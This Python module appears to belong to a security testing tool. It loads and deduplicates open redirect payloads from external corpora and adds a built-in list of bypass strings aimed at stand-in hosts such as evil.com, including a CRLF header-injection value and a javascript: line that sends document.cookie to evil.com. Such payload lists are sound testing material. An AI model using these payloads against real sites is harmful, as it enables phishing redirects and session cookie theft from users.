"""Load and normalize raw open redirect payload corpora."""
from __future__ import annotations

from pathlib import Path


def normalize_payload(line: str) -> str:
    """Strip whitespace, drop blank lines and pure comments."""
    s = line.strip()
    if not s:
        return ""
    if s.startswith("#"):
        return ""
    return s


def load_payloads_from_file(path: Path) -> list[str]:
    out: list[str] = []
    for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
        p = normalize_payload(line)
        if p:
            out.append(p)
    return out


def load_payloads_from_dir(root: Path) -> list[str]:
    """Recursively load all .txt payloads under root, deduped, order preserved."""
    root = Path(root)
    seen: set[str] = set()
    out: list[str] = []
    files = sorted(root.rglob("*.txt")) if root.is_dir() else []
    for f in files:
        for p in load_payloads_from_file(f):
            if p not in seen:
                seen.add(p)
                out.append(p)
    return out


# Built-in open redirect payloads for when no external corpus is available.
BUILTIN_PAYLOADS: list[str] = [
    "https://evil.com/",
    "http://evil.com/",
    "//evil.com/",
    "https://app.com@evil.com/",
    "//app.com@evil.com/",
    "https:evil.com/",
    "http:\\\\evil.com\\",
    "/\\/evil.com/",
    "https://evil.com#@app.com",
    "https://app.com/redirect?url=https://evil.com/",
    "javascript:fetch('https://evil.com/?c='+document.cookie)",
    "https://evil.com/",
    "//evil.com\\@app.com",
    "https:evil.com",
    "http:evil.com",
    "/////evil.com/",
    "/\\\\evil.com/",
    "%2F%2Fevil.com%2F",
    "%2F%5Cevil.com%2F",
    "https://evil.com\\@app.com",
    "https://app.com%252f@evil.com/",
    "https://evil.com/.",
    "https://app.com.evil.com/",
    "https://app.com@evil.com:80/",
    "https://evil.com\\@app.com",
    "https://evil.com\\@app.com/",
    "https:/%5cevil.com",
    "////evil.com",
    "https://evil.com\r\nLocation: https://evil.com",
    "//google.com",
    "//attacker.com/steal",
    "https://attacker.com/",
    "http://attacker.com/",
    "//attacker.com@legitimate.com/",
    "https://legitimate.com@attacker.com/",
    "https://attacker.com#.legitimate.com",
    "///attacker.com",
    "https://attacker.com\\.legitimate.com",
    "test_input",
    "hello",
    "/home",
]


def load_all_corpora(raw_dir: Path) -> list[str]:
    """Load external corpora if available, plus built-in payloads, deduped."""
    raw_dir = Path(raw_dir)
    seen: set[str] = set()
    out: list[str] = []

    for subdir in ("SecLists", "PayloadsAllTheThings"):
        d = raw_dir / subdir
        if d.is_dir():
            for payload in load_payloads_from_dir(d):
                if payload not in seen:
                    seen.add(payload)
                    out.append(payload)

    for payload in BUILTIN_PAYLOADS:
        if payload not in seen:
            seen.add(payload)
            out.append(payload)

    return out
